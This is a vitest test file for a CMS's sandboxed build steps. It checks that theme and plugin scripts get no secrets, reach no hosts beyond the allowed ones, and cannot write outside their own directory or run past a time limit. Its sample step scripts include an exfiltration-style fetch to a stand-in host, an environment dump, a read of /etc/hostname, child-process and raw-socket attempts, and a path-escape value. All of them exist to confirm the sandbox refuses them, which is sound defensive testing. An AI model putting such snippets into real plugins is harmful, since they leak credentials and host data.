import { createServer, type Server } from 'node:http';
import type { AddressInfo } from 'node:net';
import { access, cp, mkdir, mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { basename, dirname, join } from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { servePageData } from '@heopress/site-classic/page-data';
import { activate, buildSiteGeneration, checkAstroTheme, liveGeneration, runBuildStep, runBuildSteps, templateDir, type BuildStep, type BuildStepRun } from '../builder/index';
import { sampleSnapshot } from './fixtures';

/**
 * Build steps of themes and operator-trusted plugins (HeoPress P12 task 4.3; spec extensions/pipeline-extensions
 * "主题构建步骤"). A step runs as its own process with the theme build's constraints: an environment holding no CMS
 * secret or administrator credential; the network limited to the package registry and the CMS read-only page data
 * interface (anything else fails the build, the host named); writes only to its own output directory; a time limit
 * (the step is killed and the build fails, the live version stays). The CMS decides which plugins may have steps
 * (`pipelineBuildSteps`: operator-trusted only); this suite covers what the build does with them.
 */
let root: string;
let server: Server;
let pageDataUrl = '';
const TOKEN = 'tok-steps';

beforeAll(async () => {
  root = await mkdtemp(join(tmpdir(), 'heopress-steps-'));
  // A stand-in for the page data interface (loopback).
  server = createServer((req, res) => {
    const ok = req.headers.authorization === `Bearer ${TOKEN}`;
    res.writeHead(ok ? 200 : 401, { 'content-type': 'application/json' }).end(JSON.stringify(ok ? { pages: 2 } : { error: 'token' }));
  });
  await new Promise<void>((r) => server.listen(0, '127.0.0.1', () => r()));
  pageDataUrl = `http://127.0.0.1:${(server.address() as AddressInfo).port}/v1/page-data`;
});
afterAll(async () => {
  server.closeAllConnections();
  await new Promise<void>((r) => server.close(() => r()));
  await rm(root, { recursive: true, force: true });
  await rm(join(templateDir(), 'themes', '.operator'), { recursive: true, force: true });
});

let n = 0;
async function built(): Promise<BuildStepRun> {
  const outDir = join(root, `out-${++n}`);
  await mkdir(outDir, { recursive: true });
  await writeFile(join(outDir, 'index.html'), '<p>built</p>');
  return { outDir, pageData: { url: pageDataUrl, token: TOKEN } };
}
const plugin = (id: string, scriptSource: string, timeoutMs = 20_000): BuildStep => ({ owner: 'plugin', source: 'acme-og', scope: 'acme_og', id, scriptSource, timeoutMs });

describe('a build step process', () => {
  it('reads the page data and the built pages, writes its assets; its environment holds no CMS secret', async () => {
    // What the CMS process holds (fake values).
    const fake = { DATABASE_URL: 'postgresql://cms:pw@db.example.com/cms', JWT_SECRET: 'fake-jwt', ENCRYPTION_KEY: 'fake-key', HEOPRESS_ADMIN_PASSWORD: 'fake-admin', OPENAI_API_KEY: 'fake-llm' };
    Object.assign(process.env, fake);
    try {
      const run = await built();
      const r = await runBuildStep(
        run,
        plugin(
          'card',
          `import { readFileSync, writeFileSync } from 'node:fs';
const res = await fetch(process.env.HEOPRESS_PAGE_DATA_URL, { headers: { authorization: 'Bearer ' + process.env.HEOPRESS_PAGE_DATA_TOKEN } });
const page = readFileSync(process.env.HEOPRESS_BUILD_OUT_DIR + '/index.html', 'utf8');
writeFileSync(process.env.HEOPRESS_BUILD_STEP_OUT_DIR + '/card.txt', res.status + ' ' + (await res.text()) + ' ' + page);
writeFileSync(process.env.HEOPRESS_BUILD_STEP_OUT_DIR + '/env.json', JSON.stringify(process.env));
console.log('token', process.env.HEOPRESS_PAGE_DATA_TOKEN);`,
        ),
      );
      expect(r.status, r.reason ?? r.log).toBe('ran');
      const out = join(run.outDir, '_build', 'acme_og', 'card');
      expect(await readFile(join(out, 'card.txt'), 'utf8')).toBe('200 {"pages":2} <p>built</p>');
      const seen = JSON.parse(await readFile(join(out, 'env.json'), 'utf8')) as Record<string, string>;
      for (const k of Object.keys(fake)) expect(seen[k]).toBeUndefined();
      expect(Object.values(seen).join('\n')).not.toContain('fake-');
      expect(Object.keys(seen).filter((k) => !/^(PATH|HOME|TMPDIR|LANG|NODE_ENV|NODE_OPTIONS|CI|npm_config_registry|HEOPRESS_PAGE_DATA_(URL|TOKEN)|HEOPRESS_BUILD_(OUT_DIR|STEP_OUT_DIR|STEP_ID|STEP_HOSTS)|PWD|SHLVL|_|OLDPWD)$/.test(k))).toEqual([]);
      expect(seen.HEOPRESS_BUILD_STEP_HOSTS).toBe(new URL(pageDataUrl).host);
      // The token never reaches the kept log.
      expect(r.log).toContain('token [token]');
      expect(r.log).not.toContain(TOKEN);
      // The step's scratch space is gone.
      await expect(access(join(dirname(run.outDir), `.steps-${basename(run.outDir)}`, 'acme_og', 'card'))).rejects.toThrow();
    } finally {
      for (const k of Object.keys(fake)) delete process.env[k];
    }
  });

  it('a request to another host fails the step, whatever the step does with the error, and names the host', async () => {
    const run = await built();
    const r = await runBuildStep(run, plugin('leak', `try { await fetch('http://other.example.com/collect?d=1'); } catch {} console.log('carried on');`));
    expect(r.status).toBe('failed');
    expect(r.reason).toBe('requested other.example.com:80: a build step may reach only the package registry and the CMS read-only interface');
  });

  it('the page data host on another port, raw sockets and UDP are refused too', async () => {
    const run = await built();
    const port = Number(new URL(pageDataUrl).port);
    const other = await runBuildStep(run, plugin('port', `import net from 'node:net'; try { net.connect(${port + 1}, '127.0.0.1').on('error', () => {}); } catch {}`));
    expect(other.reason).toContain(`requested 127.0.0.1:${port + 1}`);
    const udp = await runBuildStep(run, plugin('udp', `import dgram from 'node:dgram'; const s = dgram.createSocket('udp4'); try { s.send('x', 53, '127.0.0.1'); } catch {} s.close();`));
    expect(udp.status).toBe('failed');
    expect(udp.reason).toContain('requested udp:127.0.0.1:53');
  });

  it('writes outside its own output directory, child processes and reads of the host are refused', async () => {
    const run = await built();
    const write = await runBuildStep(run, plugin('write', `import { writeFileSync } from 'node:fs'; writeFileSync(process.env.HEOPRESS_BUILD_OUT_DIR + '/index.html', 'replaced');`));
    expect(write.status).toBe('failed');
    expect(write.log).toContain('ERR_ACCESS_DENIED');
    expect(await readFile(join(run.outDir, 'index.html'), 'utf8')).toBe('<p>built</p>');
    const spawn = await runBuildStep(run, plugin('spawn', `import { execSync } from 'node:child_process'; execSync('true');`));
    expect(spawn.status).toBe('failed');
    expect(spawn.log).toContain('ERR_ACCESS_DENIED');
    const read = await runBuildStep(run, plugin('read', `import { readFileSync } from 'node:fs'; readFileSync('/etc/hostname');`));
    expect(read.status).toBe('failed');
    expect(read.log).toContain('ERR_ACCESS_DENIED');
  });

  it('a step past its time is killed; the first failure stops the rest', async () => {
    const run = await built();
    const started = Date.now();
    const out = await runBuildSteps(run, [plugin('slow', 'setInterval(() => {}, 1000);', 1000), plugin('after', `import { writeFileSync } from 'node:fs'; writeFileSync(process.env.HEOPRESS_BUILD_STEP_OUT_DIR + '/x', 'x');`)]);
    expect(out.ok).toBe(false);
    expect(out.results).toHaveLength(1);
    expect(out.results[0]).toMatchObject({ step: 'slow', status: 'failed', reason: 'timed out after 1000 ms' });
    expect(Date.now() - started).toBeLessThan(10_000);
    await expect(access(join(run.outDir, '_build', 'acme_og', 'after', 'x'))).rejects.toThrow();
  });
});

describe('build steps in a site build', () => {
  /** An operator theme (the starter) declaring a build step of its own. */
  async function themeWithStep(): Promise<string> {
    const themes = await mkdtemp(join(tmpdir(), 'heopress-step-themes-'));
    const dir = join(themes, 'og');
    await cp(join(templateDir(), 'themes', 'starter'), dir, { recursive: true });
    const pkgFile = join(dir, 'package.json');
    const pkg = JSON.parse(await readFile(pkgFile, 'utf8')) as { heopress: { astroTheme: Record<string, unknown> } };
    pkg.heopress.astroTheme.buildSteps = [{ id: 'og', script: 'steps/og.mjs', timeoutMs: 20_000 }];
    await writeFile(pkgFile, JSON.stringify(pkg, null, 2));
    await mkdir(join(dir, 'steps'));
    await writeFile(
      join(dir, 'steps', 'og.mjs'),
      `import { readdirSync, writeFileSync } from 'node:fs';
const res = await fetch(process.env.HEOPRESS_PAGE_DATA_URL, { headers: { authorization: 'Bearer ' + process.env.HEOPRESS_PAGE_DATA_TOKEN } });
writeFileSync(process.env.HEOPRESS_BUILD_STEP_OUT_DIR + '/og.txt', res.status + ' ' + readdirSync(process.env.HEOPRESS_BUILD_OUT_DIR).filter((f) => f.endsWith('.html')).sort().join(','));`,
    );
    return themes;
  }

  it('the theme step and a trusted plugin step publish their assets with the build; a timed-out step fails the build and the live version stays', async () => {
    const themes = await themeWithStep();
    const snapshot = sampleSnapshot();
    const pdf = plugin('pdf', `import { writeFileSync } from 'node:fs'; writeFileSync(process.env.HEOPRESS_BUILD_STEP_OUT_DIR + '/site.pdf.txt', 'pdf of ' + process.env.HEOPRESS_BUILD_STEP_ID);`);
    const out = await buildSiteGeneration({ root, generation: 1, theme: 'operator:og', snapshot, serve: servePageData, operatorThemesDir: themes, pluginSteps: [pdf] });
    expect(out.ok, out.ok ? '' : `${out.error} ${JSON.stringify(out.steps)}`).toBe(true);
    if (!out.ok) return;
    expect(out.steps?.map((s) => [s.owner, s.step, s.status])).toEqual([['theme', 'og', 'ran'], ['plugin', 'pdf', 'ran']]);
    expect(await readFile(join(out.outDir, '_build', 'theme', 'og', 'og.txt'), 'utf8')).toMatch(/^200 .*index\.html/);
    expect(await readFile(join(out.outDir, '_build', 'acme_og', 'pdf', 'site.pdf.txt'), 'utf8')).toBe('pdf of acme_og/pdf');
    await activate(root, snapshot.siteId, 1);

    const slow = plugin('slow', 'setInterval(() => {}, 1000);', 1000);
    const failed = await buildSiteGeneration({ root, generation: 2, theme: 'operator:og', snapshot: sampleSnapshot({ revision: 9 }), serve: servePageData, operatorThemesDir: themes, pluginSteps: [slow] });
    expect(failed.ok).toBe(false);
    if (failed.ok) return;
    expect(failed.stage).toBe('steps');
    expect(failed.error).toBe('build step acme-og/slow failed: timed out after 1000 ms');
    // The failed generation is removed; the live one is untouched.
    await expect(access(join(root, snapshot.siteId, 'builds', '2'))).rejects.toThrow();
    expect(await liveGeneration(root, snapshot.siteId)).toBe(1);
    expect(await readFile(join(root, snapshot.siteId, 'current', '_build', 'acme_og', 'pdf', 'site.pdf.txt'), 'utf8')).toBe('pdf of acme_og/pdf');

    // A step reaching another host fails the build the same way, with the host named.
    const leak = plugin('leak', `try { await fetch('https://other.example.com/'); } catch {}`);
    const refused = await buildSiteGeneration({ root, generation: 3, theme: 'operator:og', snapshot, serve: servePageData, operatorThemesDir: themes, pluginSteps: [leak] });
    expect(refused.ok).toBe(false);
    if (!refused.ok) expect(refused.error).toContain('requested other.example.com:443');
    expect(await liveGeneration(root, snapshot.siteId)).toBe(1);
    await rm(themes, { recursive: true, force: true });
  });

  it('the theme check refuses malformed build steps', async () => {
    const themes = await themeWithStep();
    const pkgFile = join(themes, 'og', 'package.json');
    const pkg = JSON.parse(await readFile(pkgFile, 'utf8')) as { heopress: { astroTheme: Record<string, unknown> } };
    expect(await checkAstroTheme(join(themes, 'og'))).toEqual([]);
    pkg.heopress.astroTheme.buildSteps = [
      { id: 'Bad Id', script: 'steps/og.mjs' },
      { id: 'escape', script: '../elsewhere.mjs' },
      { id: 'kind', script: 'steps/og.sh' },
      { id: 'long', script: 'steps/og.mjs', timeoutMs: 3_600_000 },
    ];
    await writeFile(pkgFile, JSON.stringify(pkg));
    // (Its script is no longer a valid step's program, so it is checked as theme code as well.)
    expect((await checkAstroTheme(join(themes, 'og'))).map((i) => i.message)).toEqual(expect.arrayContaining([
      'buildSteps: "Bad Id" is not a step id (lowercase, unique)',
      'buildSteps.escape: the script must be an .mjs or .js file inside the theme',
      'buildSteps.kind: the script must be an .mjs or .js file inside the theme',
      'buildSteps.long: timeoutMs is 1000 to 600000',
    ]));
    await rm(themes, { recursive: true, force: true });
  });
});
